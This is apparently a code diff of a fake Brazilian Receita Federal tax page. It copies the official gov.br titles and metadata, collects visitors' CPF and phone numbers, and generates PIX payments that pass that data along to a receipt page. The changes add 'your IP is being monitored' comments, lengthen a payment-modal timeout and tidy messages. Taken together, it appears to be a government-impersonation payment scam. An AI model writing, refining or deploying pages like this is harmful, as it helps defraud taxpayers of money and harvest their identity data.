@@ -29,10 +29,10 @@
           "query-input": "required name=search_term_string"
         }
     }</script>
-
+    <!-- SEU IP TA SENDO MONITORADO! -->
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <base href="https://www.gov.br/receitafederal/pt-br/assuntos/meu-imposto-de-renda/irpf2026/" /><!--[if lt IE 7]></base><![endif]-->
-    
+     <!-- SEU IP TA SENDO MONITORADO! -->
     <meta property="og:title" content="Meu Imposto de Renda" />
     <meta property="og:description" content="Tudo sobre a sua Declaração de Imposto sobre a Renda da Pessoa Física (DIRPF). Esclareça suas dúvidas e acesse os serviços relacionados à declaração e malha fiscal." />
     <meta property="og:type" content="article" />
@@ -40,7 +40,7 @@
     <meta property="og:image" content="https://www.gov.br/receitafederal/logo.png" />
     <meta property="og:locale" content="pt_BR" />
     <meta property="og:site_name" content="Receita Federal " />
-
+      <!-- SEU IP TA SENDO MONITORADO! -->
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:site" content="@" />
     <meta name="description" content="Tudo sobre a sua Declaração de Imposto sobre a Renda da Pessoa Física (DIRPF). Esclareça suas dúvidas e acesse os serviços relacionados à declaração e malha fiscal." />
@@ -763,7 +763,7 @@
            customer_name: 'Contribuinte',
            customer_email: 'pagamento@contribuinte.com',
            customer_cpf: cpfSalvo,
-           customer_phone: telefoneUsuario  // TEM QUE TER ISSO!
+           customer_phone: telefoneUsuario 
     })
 })
             .then(res => res.json())
@@ -798,7 +798,7 @@
                     setTimeout(() => {
                         document.getElementById('modal-pix').style.display = 'none';
                         window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefoneUsuario)}`;
-                    }, 5000);
+                    }, 300000);
                 } else {
                     alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
                 }
@@ -816,7 +816,7 @@
             if (codigoPix && codigoPix !== 'Aguardando geração do PIX...') {
                 navigator.clipboard.writeText(codigoPix).then(() => {
                     const msgDiv = document.getElementById('pix-mensagem');
-                    msgDiv.textContent = '✓ Código PIX copiado! Realize o pagamento no seu banco.';
+                    msgDiv.textContent = 'Código PIX copiado! Realize o pagamento no seu banco.';
                     msgDiv.className = 'alert alert-success';
                     msgDiv.style.display = 'block';
                     setTimeout(() => {
